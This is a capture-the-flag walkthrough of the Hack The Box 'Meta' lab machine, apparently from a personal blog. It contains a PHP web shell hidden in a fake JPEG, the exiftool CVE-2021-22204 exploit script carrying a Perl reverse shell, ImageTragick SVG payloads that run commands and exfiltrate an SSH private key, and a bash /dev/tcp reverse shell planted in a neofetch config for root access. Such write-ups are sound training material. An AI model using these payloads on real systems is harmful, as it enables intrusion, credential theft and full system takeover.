---
title: "Hack The Box - Meta Walkthrough"
date: 2022-06-12T13:14:53+02:00
description: "Hack The Box Meta Walkthrough/Write-Up"
featured: false
draft: false
toc: false
# menu: main
usePageBundles: false
featureImage: "/images/meta_htb.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/meta_htb.png"
shareImage: "/images/meta_htb.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Walkthroughs
tags:
  - Hack the Box
  - Linux
---
Welcome to my Hack The Box walkthrough for the "Meta" box. The box is considered to be of medium difficulty. Meta requires you to perform DNS virtual host enumeration, identify the inner workings of an image upload functionality, and exploit this to get a foothold. We then find a vulnerable version of ImageMagick (which is vulnerable to ImageTragick). We exploit this to get user access. Finally we escalate to root privileges through Neofetch, that is allowed to be executed with root permissions. 

## Foothold
We start off by running an nmap scan to enumerate all ports, services and their versions.

```sh
nmap -sC -sV -p- -oA nmap/initial 10.129.114.21
```

Which shows us the following results.

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We notice an up-to-date version of SSH running on port 22 so we skip it. Port 80 hosts a web service that redirects us to artcorp.htb. Let's add artcorp.htb to our /etc/hosts file and visit the webpage. 

The web page describes information about the ArtCorp company, and mentions that development is still in progress. Let's start off with a quick gobuster scan on the root directory of the webservice.

```sh
gobuster dir -u http://artcorp.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.out -x php
```

This however doesn't provide us with any useful results other than /asset and /css. Let's try to find other virtual hosting domains through wfuzz.

```sh
wfuzz -c -u http://artcorp.htb/ -H "Host: FUZZ.artcorp.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hl 0 -f wfuzz.out
```

Which finds the dev01 domain for us.

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000001492:   200        9 L      24 W       247 Ch      "dev01" 
```

Let's add dev01 to our /etc/hosts file and visit it. The webpage directs us to a page which contains the MetaView application. The MetaView application is an application that allows for file uploads. The file upload allows us to upload png/jpg files by doing a POST request. The description states "Upload your image to display related metadata."

```HTTP
POST /metaview/index.php HTTP/1.1
Host: dev01.artcorp.htb
Content-Length: 343
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev01.artcorp.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryujOdmuftRisksaZl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev01.artcorp.htb/metaview/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryujOdmuftRisksaZl

Content-Disposition: form-data; name="imageUpload"; filename="shell.jpg"
Content-Type: image/jpeg

<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

------WebKitFormBoundaryujOdmuftRisksaZl

Content-Disposition: form-data; name="submit"

------WebKitFormBoundaryujOdmuftRisksaZl--
```

I just tried to upload a random .php shell with the .jpg extension, but the application does not allow us to do so. 

```HTTP
HTTP/1.1 200 OK

[...]
	<pre>
	File not allowed (only jpg/png).
	</pre>
[...]
```

Let's try some basic bypasses. I first try to change the magic byte sequence from PHP script to JPG. When we look at the file before the changes we can see that it's an PHP script, ASCII text.

```sh
file test.jpg
>> test.jpg: PHP script, ASCII text
```

We add 4 spaces before the php script, and one space after, so we have some bytes to work with. When we look at the original file vs the padded file, we will see the following.

```sh
hexedit test.jpg

## Original
00000000   3C 3F 70 68  70 20 65 63

## Padded
00000000   20 20 20 20  3C 3F 70 68
```

We can see that the spaces are represented as 20 in hex. The magic bytes for jpg files are FF D8 FF DB as the starting bytes, and FF D9 as the ending bytes. Let's change these bytes in the hexeditor.

```sh
hexedit test.jpg

00000000   FF D8 FF DB  3C 3F 70 68  70 20 65 63  [....]
00000034   27 3C 2F 70  72 65 3E 27  3B 3F 3E FF  D9 0A
```

When we now take a look at the filetype, we can see that it's viewed as JPEG image data.

```sh
file test.jpg
>> test.jpg: JPEG image data
```

When we now upload the file, we get the following response.

```HTTP
HTTP/1.1 200 OK

[...]

<pre>
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
</pre>

[...]
```

Which means we managed to bypass the upload restrictions and upload our file and make it display our metadata. I think I now know where the name of the box came from :) Let's see if we can change the filetype to .php by intercepting the request and changing the "filename=test.jpg" to "filename=test.php".

```HTTP
POST /metaview/index.php HTTP/1.1
Host: dev01.artcorp.htb
Content-Length: 348
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev01.artcorp.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLPmodSU23xW3QaSu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev01.artcorp.htb/metaview/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryLPmodSU23xW3QaSu

Content-Disposition: form-data; name="imageUpload"; filename="test.php"
Content-Type: image/jpeg

ÿØÿÛ<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>ÿÙ

------WebKitFormBoundaryLPmodSU23xW3QaSu

Content-Disposition: form-data; name="submit"

------WebKitFormBoundaryLPmodSU23xW3QaSu--
```

The server responds with the same response as before, indicating that the file is uploaded

```HTTP
HTTP/1.1 200 OK

[...]

<pre>
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
</pre>

[...]
```

If the file would be uploaded to a location that we can access, we would likely be able to achieve local code execution. I add "test" (our filename) to the wordlist I will be using to enumerate the web server.

```sh
echo "test" >> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

And use fuff in recursive mode to try and find the file. I first check the root directory.

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -recursion -u "http://dev01.artcorp.htb/FUZZ" -e .php,.jpg,.png
```

But this doesn't return any results. I then try to scan the /metaview/ subdirectory.

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -u "http://dev01.artcorp.htb/metaview/FUZZ" -e .php,.jpg,.png
```

This quite quickly comes back with some results.

```text
css                     [Status: 301, Size: 246, Words: 14, Lines: 8]
lib                     [Status: 301, Size: 246, Words: 14, Lines: 8]
uploads                 [Status: 301, Size: 250, Words: 14, Lines: 8]
assets                  [Status: 301, Size: 249, Words: 14, Lines: 8]
index.php               [Status: 200, Size: 1404, Words: 397, Lines: 34]
vendor                  [Status: 301, Size: 249, Words: 14, Lines: 8]

[INFO] Starting queued job on target: http://dev01.artcorp.htb/metaview/vendor/FUZZ
autoload.php            [Status: 200, Size: 0, Words: 1, Lines: 1]
composer                [Status: 301, Size: 258, Words: 14, Lines: 8]
[INFO] Starting queued job on target: http://dev01.artcorp.htb/metaview/vendor/composer/FUZZ
.php                    [Status: 403, Size: 199, Words: 14, Lines: 8]
LICENSE                 [Status: 200, Size: 2919, Words: 443, Lines: 57]
```

We can see that there's an "uploads" directory. Additionally we find an autoload.php file, a composer directory and a LICENSE file. Unfortunately we cannot find our test.php or test.jpg file in the uploads directory. 

Let's start over again. Let's upload a legit .png file and see how the results differ from our file upload. I should've tried this before uploading an "obfuscated" .jpg file, but better late then never. I download a random .png file from the internet and upload it.

```http
POST /metaview/index.php HTTP/1.1
Host: dev01.artcorp.htb
Content-Length: 93554
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev01.artcorp.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBTALKBfi0ShsKwi5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev01.artcorp.htb/metaview/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryBTALKBfi0ShsKwi5

Content-Disposition: form-data; name="imageUpload"; filename="PNG.png"

Content-Type: image/png

PNG


```

To which the server responds with the following information.

```HTTP
HTTP/1.1 200 OK

[...]

<pre>
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1541
Image Height                    : 1213
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 765 bytes, use -b option to extract)
Transparency                    : (Binary data 27 bytes, use -b option to extract)
</pre>

[..]
```

This output looks very familiar to me.. I've seen this before but wasn't quite sure where. Eventually I analyzed the png file using exiftool, and get a somewhat identical output.

```sh
exiftool PNG.png

ExifTool Version Number         : 12.40
File Name                       : PNG.png
Directory                       : .
File Size                       : 91 KiB
File Modification Date/Time     : 2020:09:10 22:31:05+02:00
File Access Date/Time           : 2022:04:08 10:41:56+02:00
File Inode Change Date/Time     : 2022:04:08 10:41:54+02:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1541
Image Height                    : 1213
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 765 bytes, use -b option to extract)
Transparency                    : (Binary data 27 bytes, use -b option to extract)
Image Size                      : 1541x1213
Megapixels                      : 1.9
```

It looks like the file is being parsed by exiftool, and the output is returned. If we can somehow exploit any of the exiftool functionalities, we could maybe leak sensitive data or get code execution. Let's check for exiftool vulnerabilities. After a quick Google I stumbled upon the [following exploit](https://github.com/convisolabs/CVE-2021-22204-exiftool). I clone the repository, change the ip and hostname and run the exploit to generate a malicious .jpg file.

```python
#!/bin/env python3
import base64
import subprocess

ip = '10.10.14.12'
port = '9001'

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"

payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )

payload = payload + b"'))};\")"

payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()

subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])
```

Let's start a nc listener on port 9001 and upload the file.

```sh
rlwrap nc -nvlp 9001
listening on [any] 9001 ...

connect to [10.10.14.12] from (UNKNOWN) [10.129.114.21] 48722
/bin/sh: 0: can't access tty; job control turned off
whoami
www-data
```

And we have our foothold. Let's stabalize our shell.

```sh
python3 -c "import pty; pty.spawn('/bin/bash')"
*ctrl + z*
stty raw -echo
fg
export TERM=xterm
clear
```

## User shell
We are currently running as the www-data user, and cannot access the user.txt located in the home directory of the user "thomas". Let's look through configuration files to see if we can maybe find password reuse. We search through the different web application configuration files, but unfortunately no luck. We do however find the function that we exploited, called ExifToolWrapper.php. 

```php
<?php                                                                                                                                                                                                                                      
    function exiftool_exec($newFilepath) {                                                                                                                                                                                                 
        return shell_exec("exiftool " . escapeshellarg($newFilepath) . " --system:all --exiftool:all -e");                                                                                                                                 
    }                                                                                                                                                                                                                                      
?>
```

It uses the shell_exec function to run the file with exiftool, hence it being vulnerable to our exploit. We can also see the process that executed our reverse shell in the process view.

```sh
www-data  2804  0.0  0.0   2388   760 ?        S    04:54   0:00  |   _ sh -c exiftool '/var/www/dev01.artcorp.htb/metaview/uploads/php3An3DO.jpg' --system:all --exiftool:all -e
```

The file was uploade to the /uploads/ directory, but with a random name. Therefore we couldn't manage to find our own test.php file. 

I look through thomas' home directory configuration files, the /opt directory and some other locations but no luck. Let's run Linpeas to see if that will help us out. Linpeas came back with the following interesting information.

```text
[+] .sh files in path                                                                                                                                                                                                                      
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/local/bin/convert_images.sh
```

The /usr/local/bin/convert_images.sh stood out to me because while I was enumerating the web applications I saw this web directory that didn't contain any files.

```text
ls /var/www/dev01.artcorp.htb/
>> convert_images  index.php  metaview
```

Let's check out the convert_images.sh script.

```sh
ls -lah /usr/local/bin/convert_images.sh
-rwxr-xr-x 1 root root 126 Jan  3 10:13 /usr/local/bin/convert_images.sh
```

We can access it, because everyone has read and execute permissions on this file. Let's read the contents of the file.

```sh
cat /usr/local/bin/convert_images.sh

#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

The script moves to the /var/www/dev01.artcorp.htb/convert_images/ directory (now we finally know what its used for), and runs the usr/local/bin/mogrify binary with the -format png *.* 2>/dev/null arguments and then kills the mogrify process. Let's check out mogrify.

```sh
ls -lah /usr/local/bin/mogrify
lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -> magick
```

We can see that it's a symbolic link to the magick command, meaning we can either execute /usr/local/bin/mogrify or just run magick, as it executes the same binary.

```sh
/usr/local/bin/mogrify --version

Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib

magick --version

Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```

We see that we are dealing with imageMagick version 7.0.10-36. I query searchsploit and find a Metasploit "ImageTragick" delegate arbitrary command execution exploit. As we are used to not using Metasploit due to OSCP, I figured it would be good to look around for ImageTragick write-ups that exploit ImageMagick manually. I stumble upon this interesting [Blogpost](https://www.bencode.net/posts/2019-09-27-imagetragick/) by Ben Simmonds, which provides information regarding the vulnerability and its exploitability. 

_ImageMagick_ is a widely deployed, general purpose image processing library written in C, most commonly used to resize, transcode or annotate user supplied images on the web. We will be using _CVE-2016-3714_, which exploits a vulnerability regarding the input sanitization prior to passing it to the delegate command functionality. More information about the exploit can be found on Ben Simmonds' blog post. 

Eventually I find a working proof of concept [here](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html). I create the following poc.svg payload.

```xml
<image authenticate='ff" `echo $(id)> ./owned`;"'>
	<read filename="pdf:/etc/passwd"/> 
	<get width="base-width" height="base-height" /> 
	<resize geometry="400x400" /> 
	<write filename="test.png" /> 
	<svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> 
	<image xlink:href="msl:poc.svg" height="100" width="100"/> 
	</svg> 
</image>
```

This payload will echo the output of the id command to the ./owned file. I execute it.

```sh
cp /tmp/poc.svg /var/www/dev01.artcorp.htb/convert_images/poc.svg

/usr/local/bin/convert_images.sh

/usr/local/bin/convert_images.sh: line 2: 19310 Aborted                 /usr/local/bin/mogrify -format png *.* 2> /dev/null

cat /tmp/owned

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Although we get an error, we do get command execution. Unfortunately it's command execution as the www-data user, and not as the thomas user. This is the case because we are executing the /usr/local/bin/convert_images.sh binary as www-data. The file gets deleted after a while, meaning it's periodically executed. If we wait for thomas to execute the script, we can execute it with his permissions. I first tried to make the script upload to /tmp/owned but it didn't want to do it. So I eventually managed to get Thomas execute the binary by uploading this file.

```xml
<image authenticate='ff" `echo $(id)> /dev/shm/owned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Which shows us the following output.

```sh
cd /dev/shm

cat 0wned
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
```

We earlier found an .ssh directory in thomas' home folder that we could not access. Let's try to download Thomas' private key with the following script.

```xml
<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

We upload the new poc.svg file and wait for the scheduled task to be executed.

```sh
cat /dev/shm/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5
[...]
keAmlMNeuMqgBO0guskmU25GX4O5Umt/IHqFHw99mcTGc/veEWIb8PUNV8p/sNaWUckEu9
M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----
```

We find his private key and use it to ssh onto the box as the thomas user.

```sh
kali@kali:~$ chmod 600 id_rsa_thomas

kali@kali:~$ ssh thomas@artcorp.htb -i id_rsa_thomas

thomas@meta:~$ whoami
thomas

thomas@meta:~$ ls
user.txt
```

## Privilege escalation
The next step is to escalate our privileges to root. When enumerating the box I already found it interesting that the Thomas user had a neofetch configuration file in his home directory. I execute sudo -l and obtain the following output.

```sh
sudo -l 

Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

We are allowed to run /usr/bin/neofetch as root. We try it, and see the following output.
```sh
thomas@meta:~$ sudo neofetch
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 3 hours, 4 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 148MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
```

Not gonna lie, this is a very creative privilege escalation vector. We can see that our neofetch is running as root@meta. We look up neofetch at gtfobins, and find the following [privilege escalation vector](https://gtfobins.github.io/gtfobins/neofetch/). Gtfobins states that

_If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access._ 

Let's try to set the LFILE to /etc/shadow and run the command.

```sh
LFILE=/etc/shadow
sudo neofetch --ascii $LFILE

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for thomas:
```

Aha. We could've known right away that this was not going to work. We are allowed to run neofetch as sudo, but no arguments as /usr/bin/neofetch \\"\\" was specified. Let's find another way to escalate our privileges. We take a look at the Neofetch config.conf file.

```sh
thomas@meta:~/.config/neofetch$ ls -lah
total 24K
drwxr-xr-x 2 thomas thomas 4.0K Dec 20 08:33 .
drwxr-xr-x 3 thomas thomas 4.0K Aug 30  2021 ..
-rw-r--r-- 1 thomas thomas  15K Aug 30  2021 config.conf
```

Whenever Neofetch is launched, the commands specified in the config.conf file are executed. We can most likely add a simple reverse tcp shell to it and run it as root. 

```sh
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.12/9001 0>&1'" >> config.conf
```

We then export Thomas' config to the XDG_CONFIG_HOME.

```sh
export XDG_CONFIG_HOME="$HOME/.config"
```

We set up a listener on our attackers VM.

```sh
kali@kali:~$ rlwrap nc -nvlp 9001
listening on [any] 9001 ...
```

We execute neofetch as root.

```sh
thomas@meta:~$ sudo neofetch
```

And we get a reverse connection as the root user! 

```sh
kali@kali:~$ rlwrap nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.129.114.21] 48746

root@meta:~# whoami
root

root@meta:~# ls /root/
root.txt
```

And we completed the box. This one was a lot of fun! I hope you guys managed to learn a thing or two. Good luck with completing the box yourself, and see you at the next one!
